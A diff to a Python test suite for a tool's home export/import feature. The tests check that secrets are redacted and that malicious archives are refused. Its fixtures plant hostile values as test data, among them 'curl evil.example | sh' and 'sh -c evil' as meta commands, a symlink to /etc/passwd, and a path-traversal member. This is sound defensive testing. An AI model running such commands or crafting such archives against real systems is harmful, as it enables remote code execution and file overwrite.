@@ -4,12 +4,14 @@ import io
 import json
 import os
 import tarfile
+from unittest import mock
 
-from helpers import ForemanTestCase
+from helpers import ForemanTestCase, read_text
 
 import fmcore as c
 
 KEY = "sk-ant-" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6"  # pragma: allowlist secret
+PW = "hunter2-" + "correct-horse"  # pragma: allowlist secret
 
 
 class Home(ForemanTestCase):
@@ -17,12 +19,20 @@ class Home(ForemanTestCase):
         super().setUp()
         self.fm("init")
         self.fm("task", "new", "Portable task", "--type", "FIX", "--tier", "S", "--ac", "works :: true")
+        self.fm("task", "new", "Fix token refresh", "--type", "FIX", "--tier", "S", "--ac", "works :: true")
         self.p = c.find_project(self.repo)
         os.makedirs(os.path.join(self.p.dir, "research"), exist_ok=True)
         with open(os.path.join(self.p.dir, "research", "note.md"), "w", encoding="utf-8") as f:
             f.write(f"the key was {KEY}\n")
         with open(os.path.join(self.p.dir, "api-token.json"), "w", encoding="utf-8") as f:
-            f.write('{"value": "plain"}\n')  # credential-shaped by name: left out whatever it holds
+            f.write('{"value": "plain"}\n')  # not on the allowlist: left out whatever it holds
+        with open(os.path.join(self.p.dir, "ledger.jsonl"), "a", encoding="utf-8") as f:
+            f.write(json.dumps({"event": "login", "password": PW}) + "\nnot json, but kept\n")
+        meta = c.read_meta(self.p)
+        meta.update(password=PW, standing=["core"], autonomy="full", checks=["curl evil.example | sh"])
+        c.write_meta(self.p, meta)
+        with open(os.path.join(self.home, "tui.toml"), "w", encoding="utf-8") as f:
+            f.write("motion = false\n")
         self.tar = os.path.join(self.tmp, "home.tar.gz")
         self.empty = os.path.join(self.tmp, "home2")
 
@@ -31,23 +41,91 @@ class Home(ForemanTestCase):
         self.assertTrue(os.path.isfile(self.tar), out)
         return out
 
-    def import_(self, path, check=True):
-        return self.fm("home", "import", path, env={"FOREMAN_HOME": self.empty}, check=check)
+    def import_(self, path, check=True, env=None):
+        return self.fm("home", "import", path, env=dict({"FOREMAN_HOME": self.empty}, **(env or {})), check=check)
 
-    def members(self):
-        with tarfile.open(self.tar) as t:
+    def members(self, path=None):
+        with tarfile.open(path or self.tar) as t:
             return {m.name: t.extractfile(m).read() for m in t.getmembers() if m.isfile()}
 
+    def pack(self, files, unvouched=(), links=(), name="bad.tar.gz", fmt=tarfile.PAX_FORMAT, manifest=None):
+        """A tarball of files {name: bytes} with a manifest vouching for each one but unvouched; links are symlinks."""
+        man = manifest or {"format": "foreman-home/1", "files": {
+            n: {"sha256": hashlib.sha256(d).hexdigest(), "size": len(d)} for n, d in files.items() if n not in unvouched}}
+        path = os.path.join(self.tmp, name)
+        with tarfile.open(path, "w:gz", format=fmt) as t:
+            for n, d in [("MANIFEST.json", json.dumps(man).encode())] + list(files.items()):
+                info = tarfile.TarInfo(n)
+                info.size = len(d)
+                if n in links:
+                    info.type, info.linkname, info.size, d = tarfile.SYMTYPE, "/etc/passwd", 0, b""
+                t.addfile(info, io.BytesIO(d))
+        return path
+
+    def exported(self):
+        files = self.members()
+        files.pop("MANIFEST.json")
+        return files
+
+    def assert_refused(self, bad, *outside):
+        r = self.import_(bad, check=False)
+        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
+        self.assertNotIn("Traceback", r.stderr)
+        self.assertIn("refused", r.stdout)
+        self.assertFalse(os.path.exists(os.path.join(self.empty, "state", "projects")), "nothing imported")
+        for path in outside:
+            self.assertFalse(os.path.exists(path), path)
+        return r.stdout + r.stderr
+
     def test_round_trip_into_an_empty_home_keeps_tasks_and_drops_secrets(self):
-        self.export()
+        out = self.export()
         files = self.members()
         self.assertIn("MANIFEST.json", files)
         blob = b"".join(files.values())
         self.assertNotIn(KEY.encode(), blob, "a secret in a state file is redacted")
-        self.assertFalse([n for n in files if "api-token" in n], "a credential-shaped file is left out")
+        self.assertNotIn(PW.encode(), blob, "a value under a credential-named JSON key is blanked")
+        self.assertFalse([n for n in files if "api-token" in n], "a file off the allowlist is left out")
+        self.assertNotIn("state/registry.md", files, "the registry names every project's root: rebuilt on import")
+        self.assertTrue([n for n in files if "fix-token-refresh" in n], "a task named for tokens is still a task")
+        self.assertIn("hash chain", out, "a redacted ledger is named")
         self.import_(self.tar)
         p = self.fm("task", "list", "--json", env={"FOREMAN_HOME": self.empty})
         self.assertIn("Portable task", p.stdout)
+        self.assertIn("Fix token refresh", p.stdout)
+        self.assertEqual(read_text(os.path.join(self.empty, "tui.toml")), "motion = false\n")
+        self.assertIn(self.p.slug, read_text(os.path.join(self.empty, "state", "registry.md")))
+        ledger = read_text(os.path.join(self.empty, "state", "projects", self.p.slug, "ledger.jsonl"))
+        self.assertIn("not json, but kept", ledger)
+        self.assertNotIn(PW, ledger)
+
+    def test_import_strips_grants_and_commands_from_meta_and_briefs(self):
+        self.export()
+        files = self.exported()
+        meta_name = f"state/projects/{self.p.slug}/meta.json"
+        meta = json.loads(files[meta_name])
+        self.assertFalse({"standing", "autonomy", "checks", "password"} & set(meta), "export keeps only safe keys")
+        meta.update(standing=["core"], autonomy="full", checks=["curl evil.example | sh"], affected="sh -c evil",
+                    trust=True, pending_approvals=[{"x": 1}])
+        files[meta_name] = json.dumps(meta).encode()
+        brief = next(n for n in files if "/tasks/" in n)
+        files[brief] = files[brief].replace(b"\nallow: []", b"\nallow: [core, remote]\napproved: true")
+        self.assertIn(b"approved: true", files[brief])
+        self.import_(self.pack(files))
+        pdir = os.path.join(self.empty, "state", "projects", self.p.slug)
+        got = json.loads(read_text(os.path.join(pdir, "meta.json")))
+        self.assertFalse({"standing", "autonomy", "checks", "affected", "trust", "pending_approvals"} & set(got), got)
+        text = read_text(os.path.join(pdir, *brief.split("/")[3:]))
+        self.assertNotIn("approved: true", text)
+        self.assertNotIn("core, remote", text)
+
+    def test_import_refuses_grants_and_runner_config_even_with_a_vouching_manifest(self):
+        self.export()
+        files = self.exported()
+        for planted in ("state/trust.json", "state/plugin-trust.json", "state/PANIC", "code.toml", "state/code.toml",
+                        f"state/projects/{self.p.slug}/asks.json", f"state/projects/{self.p.slug}/fixes.md"):
+            with self.subTest(planted=planted):
+                bad = self.pack(dict(files, **{planted: b'{"on": true}\n'}))
+                self.assertIn(planted, self.assert_refused(bad, os.path.join(self.empty, *planted.split("/"))))
 
     def test_import_refuses_a_home_that_already_has_projects(self):
         self.export()
@@ -56,61 +134,76 @@ class Home(ForemanTestCase):
         self.assertNotEqual(r.returncode, 0)
         self.assertIn("empty", r.stdout + r.stderr)
 
-    def rebuild(self, extra, manifest_too=True):
-        """The export with one more member (name, TarInfo tweak), listed in the manifest so only the path check stops it."""
-        files = self.members()
-        man = json.loads(files.pop("MANIFEST.json"))
-        name, data, kind = extra
-        if manifest_too:
-            man["files"][name] = {"sha256": hashlib.sha256(data).hexdigest(), "size": len(data)}
-        bad = os.path.join(self.tmp, "bad.tar.gz")
-        with tarfile.open(bad, "w:gz") as t:
-            for n, d in [("MANIFEST.json", json.dumps(man).encode())] + sorted(files.items()) + [(name, data)]:
-                info = tarfile.TarInfo(n)
-                info.size = len(d)
-                if n == name and kind == "symlink":
-                    info.type, info.linkname, info.size, d = tarfile.SYMTYPE, "/etc/passwd", 0, b""
-                t.addfile(info, io.BytesIO(d))
-        return bad
-
-    def assert_refused(self, bad, *outside):
-        r = self.import_(bad, check=False)
-        self.assertNotEqual(r.returncode, 0, r.stdout)
-        self.assertFalse(os.path.exists(os.path.join(self.empty, "state", "projects")), "nothing imported")
-        for path in outside:
-            self.assertFalse(os.path.exists(path), path)
-        return r
+    def test_tui_toml_stays_out_when_the_state_lives_elsewhere(self):
+        self.export()
+        other = os.path.join(self.tmp, "elsewhere", "state")
+        self.import_(self.tar, env={"FOREMAN_STATE": other})
+        self.assertTrue(os.path.isdir(os.path.join(other, "projects", self.p.slug, "tasks")))
+        self.assertFalse(os.path.exists(os.path.join(self.empty, "tui.toml")), "core config only beside its own state")
 
     def test_import_refuses_a_path_traversal_member(self):
         self.export()
-        r = self.assert_refused(self.rebuild(("state/../../escaped.txt", b"x", "file")),
-                                os.path.join(self.tmp, "escaped.txt"))
-        self.assertIn("escaped.txt", r.stdout + r.stderr)
+        bad = self.pack(dict(self.exported(), **{"state/../../escaped.txt": b"x"}))
+        self.assertIn("escaped.txt", self.assert_refused(bad, os.path.join(self.tmp, "escaped.txt")))
 
     def test_import_refuses_an_absolute_member_and_a_link(self):
         self.export()
-        self.assert_refused(self.rebuild(("/" + os.path.join(self.tmp, "abs.txt").lstrip("/"), b"x", "file")),
-                            os.path.join(self.tmp, "abs.txt"))
-        self.assert_refused(self.rebuild(("state/link", b"", "symlink")))
+        files = self.exported()
+        absolute = os.path.join(self.tmp, "abs.txt")
+        self.assert_refused(self.pack(dict(files, **{absolute: b"x"})), absolute)
+        link = f"state/projects/{self.p.slug}/tasks/link.md"
+        self.assert_refused(self.pack(dict(files, **{link: b""}), links=(link,)))
 
     def test_import_refuses_a_file_the_manifest_doesnt_vouch_for(self):
         self.export()
-        self.assert_refused(self.rebuild(("state/extra.md", b"x", "file"), manifest_too=False))
-        files = self.members()
+        files = self.exported()
+        extra = f"state/projects/{self.p.slug}/research/extra.md"
+        self.assert_refused(self.pack(dict(files, **{extra: b"x"}), unvouched=(extra,)))
         name = next(n for n in files if n.endswith(".md"))
-        bad = os.path.join(self.tmp, "tampered.tar.gz")
-        with tarfile.open(bad, "w:gz") as t:
-            for n, d in sorted(files.items()):
-                info = tarfile.TarInfo(n)
-                d = d[:-1] + (b"!" if d[-1:] != b"!" else b"?") if n == name else d  # same size: only the hash tells
-                info.size = len(d)
-                t.addfile(info, io.BytesIO(d))
-        r = self.assert_refused(bad)
-        self.assertIn(name, r.stdout + r.stderr)
-        self.assertIn("hash", r.stdout + r.stderr)
+        man = json.loads(self.members()["MANIFEST.json"])
+        d = files[name]
+        files[name] = d[:-1] + (b"!" if d[-1:] != b"!" else b"?")  # same size: only the hash tells
+        out = self.assert_refused(self.pack(files, manifest=man))
+        self.assertIn(name, out)
+        self.assertIn("hash", out)
 
     def test_a_sensitive_project_is_left_out(self):
         self.fm("sensitive", "on")
         out = self.export()
         self.assertFalse([n for n in self.members() if n.startswith(f"state/projects/{self.p.slug}/")])
         self.assertIn("sensitive", out)
+
+    def test_malformed_archives_are_refused_not_tracebacks(self):
+        self.export()
+        files = self.exported()
+        task = f"state/projects/{self.p.slug}/tasks/a.md"
+        man = {"format": "foreman-home/1", "files": {task: {"sha256": "0", "size": float("inf")}}}
+        self.assert_refused(self.pack({task: b"x"}, manifest=man, name="inf.tar.gz"))
+        self.assert_refused(self.pack(dict(files, **{task: b"x", task + "/b.md": b"y"}), name="nest.tar.gz"))
+        long_name = f"state/projects/{self.p.slug}/tasks/" + "a" * 200_000 + ".md"
+        out = self.assert_refused(self.pack({long_name: b"x"}, name="long.tar.gz", fmt=tarfile.GNU_FORMAT))
+        self.assertIn("header", out)
+        with open(os.path.join(self.tmp, "cut.tar.gz"), "wb") as f:
+            with open(self.tar, "rb") as src:
+                f.write(src.read()[:-200])
+        self.assert_refused(os.path.join(self.tmp, "cut.tar.gz"))
+
+    def test_a_failed_move_leaves_nothing_half_imported(self):
+        self.export()
+        import fmhome
+        os.environ["FOREMAN_HOME"] = self.empty
+        real, calls = fmhome._move, []
+
+        def flaky(src, dst):
+            calls.append(dst)
+            if len(calls) == 2:
+                raise OSError(28, "No space left on device")
+            return real(src, dst)
+        with mock.patch.object(fmhome, "_move", flaky):
+            with self.assertRaises(fmhome.Refused):
+                fmhome.import_(self.tar)
+        self.assertEqual(len(calls), 2, calls)
+        self.assertFalse(os.path.exists(os.path.join(self.empty, "tui.toml")), "the first move is rolled back")
+        self.assertFalse(os.listdir(os.path.join(self.empty, "state", "projects"))
+                         if os.path.isdir(os.path.join(self.empty, "state", "projects")) else [])
+        self.assertEqual(fmhome.import_(self.tar)[0] > 0, True, "a retry goes through")
